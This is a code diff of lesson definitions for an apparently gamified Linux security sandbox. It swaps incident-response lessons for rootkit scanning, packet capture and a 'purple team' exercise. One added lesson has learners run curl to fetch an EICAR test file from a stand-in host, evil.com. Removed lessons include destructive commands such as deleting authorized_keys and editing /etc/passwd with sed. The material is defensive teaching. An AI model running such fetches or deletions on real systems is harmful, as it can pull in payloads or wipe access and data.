-      title: "Audit SUID Binaries",
-      why: "If an attacker escalated to root once, they will leave a backdoor to do it again instantly. They often copy <code>/bin/bash</code> to a hidden folder and apply the SUID permission. Finding unauthorized SUID files is critical.",
-      text: "Type <code>find / -perm -4000 -type f 2>/dev/null</code>",
-      objective: "Find SUID files",
-      xp: 50,
-      check: (c, a) =>
-        c === "find" && a.includes("-perm") && a.includes("-4000"),
-    },
-    {
-      title: "Audit SGID Binaries",
-      why: "Check for maliciously altered Group permissions as well. The <code>2>/dev/null</code> part of the command redirects all 'Permission Denied' errors into a black hole so your screen stays clean.",
-      text: "Type <code>find / -perm -2000 -type f 2>/dev/null</code>",
-      objective: "Find SGID files",
-      xp: 50,
-      check: (c, a) =>
-        c === "find" && a.includes("-perm") && a.includes("-2000"),
-    },
-    {
-      title: "Find Recently Modified",
-      why: "If the breach happened yesterday, query the filesystem for timestamps. The <b>-mtime -1</b> flag asks `find` to output any file in the /tmp directory that was modified in the last 24 hours.",
-      text: "Type <code>find /tmp -type f -mtime -1</code>",
-      objective: "Find recently modified files",
+      title: "Write PCAP File",
+      why: "Terminal output is hard to read. The <b>-w</b> flag writes the raw intercepted frames into a binary PCAP file, allowing analysts to export the data and open it in a GUI tool like Wireshark.",
+      text: "Type <code>tcpdump -i any -w capture.pcap -c 10</code>",
+      objective: "Write to capture.pcap",
       xp: 40,
       check: (c, a) =>
-        c === "find" &&
-        a.includes("-type") &&
-        a.includes("-mtime") &&
-        a.includes("-1"),
+        c === "tcpdump" && a.includes("-w") && a.includes("capture.pcap"),
     },
     {
-      title: "Hunt PHP Web Shells",
-      why: "If the server runs a website, attackers drop PHP files (like 'cmd.php') that allow them to execute terminal commands through their web browser. Scan the web directory for hidden scripts.",
-      text: 'Type <code>find /var/www/html -name "*.php"</code>',
-      objective: "Find PHP files in web directory",
+      title: "Read PCAP File",
+      why: "The <b>-r</b> flag allows you to read and parse a saved binary PCAP file without needing an active network interface.",
+      text: "Type <code>tcpdump -r capture.pcap</code>",
+      objective: "Read capture.pcap",
+      xp: 30,
+      check: (c, a) =>
+        c === "tcpdump" && a.includes("-r") && a.includes("capture.pcap"),
+    },
+    {
+      title: "Rootkit Hunter",
+      why: "Rootkits alter the Linux kernel itself, hiding their existence from tools like `ps` or `netstat`. <b>chkrootkit</b> runs heuristics against system binaries to detect hidden kernel hooks and unauthorized memory changes.",
+      text: "Type <code>chkrootkit</code>",
+      objective: "Type chkrootkit",
+      xp: 20,
+      check: (c) => c === "chkrootkit",
+    },
+    {
+      title: "Quiet Rootkit Scan",
+      why: "The <b>-q</b> flag suppresses standard output, forcing the scanner to only print an alert if it absolutely guarantees a rootkit infection was found.",
+      text: "Type <code>chkrootkit -q</code>",
+      objective: "Type chkrootkit -q",
+      xp: 25,
+      check: (c, a) => c === "chkrootkit" && a.includes("-q"),
+    },
+    {
+      title: "AppArmor Status",
+      why: "<b>AppArmor</b> is a Mandatory Access Control (MAC) system that physically prevents compromised applications from touching files they shouldn't. This command verifies the kernel module is loaded and enforcing profiles.",
+      text: "Type <code>aa-status</code>",
+      objective: "Type aa-status",
+      xp: 20,
+      check: (c) => c === "aa-status" || c === "apparmor_status",
+    },
+    {
+      title: "File Permissions Audit",
+      why: "The <b>-perm -2</b> flag finds 'World-Writable' files. This is a critical security flaw where any user on the system, regardless of privilege, can overwrite or inject code into the file.",
+      text: "Type <code>find / -perm -2 -type f</code>",
+      objective: "Find world writable files",
       xp: 40,
-      check: (c, a) =>
-        c === "find" && a.includes("/var/www/html") && a.includes("-name"),
+      check: (c, a) => c === "find" && a.includes("-perm") && a.includes("-2"),
     },
     {
-      title: "Log Backdoor",
-      why: "You found a suspicious binary in the temp directory! Document the finding for the Eradication phase.",
-      text: 'Type <code>echo "Backdoor found" >> ir_log.txt</code>',
-      objective: "Log backdoor discovery",
+      title: "Check Failed Logins",
+      why: "The <b>lastb</b> command parses the `/var/log/btmp` file, which is specifically dedicated to tracking failed SSH handshakes and rejected authentication protocols.",
+      text: "Type <code>lastb</code>",
+      objective: "Type lastb",
       xp: 20,
-      check: (c, a, o, raw) =>
-        raw.includes("echo") &&
-        raw.includes("Backdoor") &&
-        raw.includes("ir_log.txt"),
-    },
-
-    // --- PHASE 4: CONTAINMENT & FIREWALLING (46-55) ---
-    {
-      title: "Kill Malware Process",
-      why: "Containment begins now. Issue a standard SIGTERM to PID 1234 to attempt to gracefully close the malware's open network sockets and shut down its threads.",
-      text: "Type <code>kill 1234</code>",
-      objective: "Kill PID 1234",
-      xp: 20,
-      check: (c, a) => c === "kill" && a[0] === "1234",
+      check: (c) => c === "lastb",
     },
     {
-      title: "Force Kill Malware",
-      why: "Advanced malware ignores SIGTERM signals to protect itself. You must use <b>kill -9</b> to send a SIGKILL. The kernel intercepts this and violently deletes the malware's memory space without giving it a chance to react.",
-      text: "Type <code>kill -9 1234</code>",
-      objective: "Force kill PID 1234",
-      xp: 25,
-      check: (c, a) => c === "kill" && a.includes("-9") && a.includes("1234"),
-    },
-    {
-      title: "Kill C2 Tooling",
-      why: "If the attacker is using tools like Netcat to maintain redundant connections, massacre all instances of the tool globally across the server.",
-      text: "Type <code>killall netcat</code>",
-      objective: "Kill all netcat processes",
-      xp: 25,
-      check: (c, a) => c === "killall" && a[0] === "netcat",
-    },
-    {
-      title: "Check Firewall Rules",
-      why: "Linux uses <b>iptables</b> to program the kernel's Netfilter network routing module. Running <b>-L</b> lists the current rule chains (INPUT, OUTPUT, FORWARD) to see if the attacker disabled your defenses.",
-      text: "Type <code>iptables -L</code>",
-      objective: "List iptables rules",
-      xp: 20,
-      check: (c, a) => c === "iptables" && a.includes("-L"),
-    },
-    {
-      title: "Block Inbound Traffic",
-      why: "Cut the attacker off. <b>-A INPUT</b> appends a rule to the incoming chain. <b>-s</b> targets the attacker's Source IP. <b>-j DROP</b> tells the kernel to silently delete any packet from that IP before it even hits the application layer.",
-      text: "Type <code>iptables -A INPUT -s 10.0.0.99 -j DROP</code>",
-      objective: "Drop inbound attacker traffic",
-      xp: 45,
+      title: "Save Audit Report",
+      why: "Compile the results of the rootkit scan into a master Purple Team audit file.",
+      text: "Type <code>chkrootkit > audit.txt</code>",
+      objective: "Redirect chkrootkit to audit.txt",
+      xp: 30,
       check: (c, a) =>
-        c === "iptables" &&
-        a.includes("-A") &&
-        a.includes("INPUT") &&
-        a.includes("-s") &&
-        a.includes("10.0.0.99") &&
-        a.includes("DROP"),
+        c === "chkrootkit" && a.includes(">") && a.includes("audit.txt"),
     },
     {
-      title: "Block Outbound Traffic",
-      why: "If the malware operates via a Reverse Shell, blocking inbound traffic isn't enough because the malware initiates the connection *outward*. <b>-A OUTPUT -d</b> blocks the server from sending data to the attacker's Destination IP.",
-      text: "Type <code>iptables -A OUTPUT -d 10.0.0.99 -j DROP</code>",
-      objective: "Drop outbound attacker traffic",
-      xp: 45,
+      title: "Append LSOF",
+      why: "Append the active file descriptor footprint into the audit file for cross-referencing.",
+      text: "Type <code>lsof -iTCP >> audit.txt</code>",
+      objective: "Append lsof to audit.txt",
+      xp: 30,
       check: (c, a) =>
-        c === "iptables" &&
-        a.includes("-A") &&
-        a.includes("OUTPUT") &&
-        a.includes("-d") &&
-        a.includes("10.0.0.99") &&
-        a.includes("DROP"),
+        c === "lsof" && a.includes(">>") && a.includes("audit.txt"),
     },
     {
-      title: "Save Firewall Rules",
-      why: "Iptables rules are applied purely in RAM. If the server reboots, the attacker's IP will be unblocked. You must save the rules to the hard drive so the system restores them on boot.",
-      text: "Type <code>iptables-save > /etc/iptables/rules.v4</code>",
-      objective: "Save iptables rules",
-      xp: 35,
-      check: (c, a, o, raw) =>
-        raw.includes("iptables-save") &&
-        raw.includes(">") &&
-        raw.includes("/etc/iptables/rules.v4"),
-    },
-    {
-      title: "Stop Vulnerable Service",
-      why: "If the attacker got in by exploiting a zero-day in the web server, you must turn Nginx off completely until the patching team can apply a security update. Contain the breach.",
-      text: "Type <code>systemctl stop nginx</code>",
-      objective: "Stop the web server",
-      xp: 20,
-      check: (c, a) =>
-        c === "systemctl" && a.includes("stop") && a.includes("nginx"),
-    },
-    {
-      title: "Quarantine File",
-      why: "Before deleting the malware, you should quarantine it for the Reverse Engineering team to analyze. <b>chmod 000</b> removes all read, write, and execute permissions, locking the file down entirely.",
-      text: "Type <code>chmod 000 /tmp/malware.bin</code>",
-      objective: "Remove all permissions from malware",
-      xp: 25,
-      check: (c, a) =>
-        c === "chmod" && a.includes("000") && a.includes("/tmp/malware.bin"),
-    },
-    {
-      title: "Log Containment",
-      why: "Document that network isolation has been achieved and the bleeding has stopped.",
-      text: 'Type <code>echo "Attacker Blocked" >> ir_log.txt</code>',
-      objective: "Log containment",
-      xp: 20,
-      check: (c, a, o, raw) =>
-        raw.includes("echo") &&
-        raw.includes("Blocked") &&
-        raw.includes("ir_log.txt"),
-    },
-
-    // --- PHASE 5: ERADICATION & RECOVERY (56-65) ---
-    {
-      title: "Delete Malware",
-      why: "The Reverse Engineers grabbed their copy. Now, eradicate the malicious binary from the production filesystem completely.",
-      text: "Type <code>rm /tmp/malware.bin</code>",
-      objective: "Remove malware binary",
-      xp: 15,
-      check: (c, a) => c === "rm" && a[0] === "/tmp/malware.bin",
-    },
-    {
-      title: "Delete Rogue SSH Keys",
-      why: "Eradicate the attacker's persistence. By deleting the authorized_keys file, you wipe out their cryptographic backdoor access.",
-      text: "Type <code>rm ~/.ssh/authorized_keys</code>",
-      objective: "Remove rogue SSH keys",
-      xp: 20,
-      check: (c, a) => c === "rm" && a[0] === "~/.ssh/authorized_keys",
-    },
-    {
-      title: "Remove Rogue User",
-      why: "The attacker created an invisible user account named 'hacker'. Use <b>sed</b> to surgically delete the specific row containing 'hacker' directly out of the <code>/etc/passwd</code> file.",
-      text: "Type <code>sed -i '/hacker/d' /etc/passwd</code>",
-      objective: "Remove rogue user via sed",
-      xp: 45,
-      check: (c, a, o, raw) =>
-        raw.includes("sed") &&
-        raw.includes("-i") &&
-        raw.includes("/hacker/d") &&
-        raw.includes("/etc/passwd"),
-    },
-    {
-      title: "Purge Staging Folders",
-      why: "Attackers often hide multiple scripts inside dotfiles (like `.cache`). Nuke the entire hidden staging directory recursively.",
-      text: "Type <code>rm -rf /tmp/.cache</code>",
-      objective: "Force remove hidden cache",
-      xp: 25,
-      check: (c, a) =>
-        c === "rm" && a.includes("-rf") && a.includes("/tmp/.cache"),
-    },
-    {
-      title: "Final Network Audit",
-      why: "Trust, but verify. Run a final sweep of the active network sockets to ensure no new rogue listeners spawned during the eradication phase.",
-      text: "Type <code>netstat -tuln</code>",
-      objective: "Verify clean network sockets",
-      xp: 15,
-      check: (c, a) => c === "netstat" && a.includes("-tuln"),
-    },
-    {
-      title: "Final Process Audit",
-      why: "Run a final sweep of the process table to ensure the CPU is completely clean.",
-      text: "Type <code>ps aux</code>",
-      objective: "Verify clean process table",
-      xp: 15,
-      check: (c, a) => c === "ps" && a.includes("aux"),
-    },
-    {
-      title: "Review IR Log",
-      why: "Read your compiled Incident Response report to ensure all timestamps, PIDs, and attacker IPs were captured correctly for the Chief Information Security Officer (CISO).",
-      text: "Type <code>cat ir_log.txt</code>",
-      objective: "Review the IR log",
-      xp: 15,
-      check: (c, a) => c === "cat" && a[0] === "ir_log.txt",
-    },
-    {
-      title: "Archive Evidence",
-      why: "Package the text file into a compressed tarball so it can be securely emailed to the external forensic auditing team.",
-      text: "Type <code>tar -czvf incident_report.tar.gz ir_log.txt</code>",
-      objective: "Compress the IR log",
-      xp: 40,
-      check: (c, a) =>
-        c === "tar" &&
-        a.includes("-czvf") &&
-        a.includes("incident_report.tar.gz") &&
-        a.includes("ir_log.txt"),
-    },
-    {
-      title: "Clean Workspace",
-      why: "Remove the raw text file from the server now that it is securely compressed in the archive.",
-      text: "Type <code>rm ir_log.txt</code>",
-      objective: "Delete the raw log",
+      title: "Read Audit",
+      why: "Verify the density of the compiled report.",
+      text: "Type <code>cat audit.txt</code>",
+      objective: "Read audit.txt",
       xp: 10,
-      check: (c, a) => c === "rm" && a[0] === "ir_log.txt",
+      check: (c, a) => c === "cat" && a[0] === "audit.txt",
     },
     {
-      title: "Incident Closed",
-      why: "You identified the breach, hunted the process memory, walled off the network, and eradicated the threat. You are an elite Blue Teamer.",
-      text: 'Type <code>echo "Incident Resolved"</code>',
-      objective: "Echo final message",
-      xp: 100,
-      check: (c, a, o, raw) => raw.includes("echo") && raw.includes("Resolved"),
+      title: "Count Audit",
+      why: "Calculate the exact line length of the completed audit document.",
+      text: "Type <code>wc -l audit.txt</code>",
+      objective: "Count lines in audit.txt",
+      xp: 15,
+      check: (c, a) =>
+        c === "wc" && a.includes("-l") && a.includes("audit.txt"),
+    },
+
+    // --- PHASE 5: PURPLE TEAM VALIDATION LOOP (56-65) ---
+    {
+      title: "Simulate Attack",
+      why: "Red Team Execution: Use curl to download an inert EICAR malware signature. The goal is to see if the Endpoint Detection and Response (EDR) stack intercepts the payload.",
+      text: "Type <code>curl -O http://evil.com/eicar.com</code>",
+      objective: "Download test payload",
+      xp: 30,
+      check: (c, a) => c === "curl" && a.includes("eicar.com"),
+    },
+    {
+      title: "Verify Attack Log",
+      why: "Blue Team Execution: Query the systemd journal to mathematically prove that the execution of the curl command was logged and tagged for the SIEM.",
+      text: "Type <code>journalctl | grep curl</code>",
+      objective: "Grep curl from journalctl",
+      xp: 35,
+      check: (c, a) => c === "journalctl" || c === "grep",
+    },
+    {
+      title: "Isolate IP",
+      why: "Blue Team Execution: Isolate the Indicator of Compromise (IoC). The attacking C2 server originates from 10.0.0.99.",
+      text: 'Type <code>echo "Target IP: 10.0.0.99"</code>',
+      objective: "Identify 10.0.0.99",
+      xp: 15,
+      check: (c, a) => c === "echo" && a.includes("10.0.0.99"),
+    },
+    {
+      title: "Deploy Countermeasure",
+      why: "Blue Team Execution: Inject an iptables routing rule directly into the kernel's Netfilter module to drop all outbound packets destined for the C2 infrastructure.",
+      text: "Type <code>iptables -A OUTPUT -d 10.0.0.99 -j DROP</code>",
+      objective: "Block outbound to 10.0.0.99",
+      xp: 40,
+      check: (c, a) =>
+        c === "iptables" &&
+        a.includes("-A") &&
+        a.includes("10.0.0.99") &&
+        a.includes("DROP"),
+    },
+    {
+      title: "Validate Countermeasure",
+      why: "Red Team Execution: Attempt to ping the C2 server. If the firewall rule is valid, the ping will fail or timeout, proving the countermeasure works.",
+      text: "Type <code>ping -c 1 10.0.0.99</code>",
+      objective: "Ping the blocked IP",
+      xp: 30,
+      check: (c, a) => c === "ping" && a.includes("10.0.0.99"),
+    },
+    {
+      title: "Audit Dropped Packets",
+      why: "Blue Team Execution: Run a packet capture on the interface to physically watch the kernel intercept and drop the ping request in real-time.",
+      text: "Type <code>tcpdump host 10.0.0.99 -c 2</code>",
+      objective: "Run tcpdump on 10.0.0.99",
+      xp: 40,
+      check: (c, a) => c === "tcpdump" && a.includes("10.0.0.99"),
+    },
+    {
+      title: "Delete Payload",
+      why: "Purple Team Verification: Eradicate the inert testing payload from the filesystem.",
+      text: "Type <code>rm eicar.com</code>",
+      objective: "rm eicar.com",
+      xp: 15,
+      check: (c, a) => c === "rm" && a[0] === "eicar.com",
+    },
+    {
+      title: "Check Network State",
+      why: "Purple Team Verification: Audit the active kernel sockets one last time to ensure the environment has returned to a completely stable, closed baseline.",
+      text: "Type <code>ss -tulnp</code>",
+      objective: "Type ss -tulnp",
+      xp: 20,
+      check: (c, a) => c === "ss" && a.includes("-tulnp"),
+    },
+    {
+      title: "Report Generation",
+      why: "Purple Team Sign-Off: Create a final attestation file validating that the defense capabilities successfully blocked the simulated threat vector.",
+      text: 'Type <code>echo "Test Complete: Defense Validated" > purple.log</code>',
+      objective: "Create purple.log",
+      xp: 20,
+      check: (c, a) =>
+        c === "echo" && a.includes(">") && a.includes("purple.log"),
+    },
+    {
+      title: "Sign-Off",
+      why: "You understand Threat Hunting, Kernel Auditing, and Purple Team Architecture. You have completed the Mega Sandbox Curriculum.",
+      text: "Type <code>cat purple.log</code>",
+      objective: "Read purple.log",
+      xp: 15,
+      check: (c, a) => c === "cat" && a[0] === "purple.log",
     },
   ],
 };
